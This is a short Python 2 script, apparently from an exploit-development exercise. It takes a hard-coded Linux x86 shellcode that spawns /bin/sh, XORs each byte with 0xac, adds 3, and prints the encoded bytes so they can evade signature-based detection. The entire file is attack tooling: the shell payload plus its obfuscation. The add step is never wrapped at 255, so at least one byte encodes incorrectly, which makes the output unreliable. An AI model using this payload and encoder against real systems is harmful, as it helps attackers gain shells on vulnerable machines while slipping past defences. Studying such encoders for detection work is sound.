#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""
xor = 0xac

# XOR every byte with 0xac and after that add 3 to every byte

for x in bytearray(shellcode):

# XOR every byte with 0xac
	byte = x ^ xor

# Add 3 to every byte
	encoded += '\\x'
	encoded += '%02x' % (byte + 3)

	encoded2 += '0x'
	encoded2 += '%02x,' % (byte + 3)

print "Encoded Shellcode:"
print encoded
print "Encoded2 Shellcode:"
print encoded2
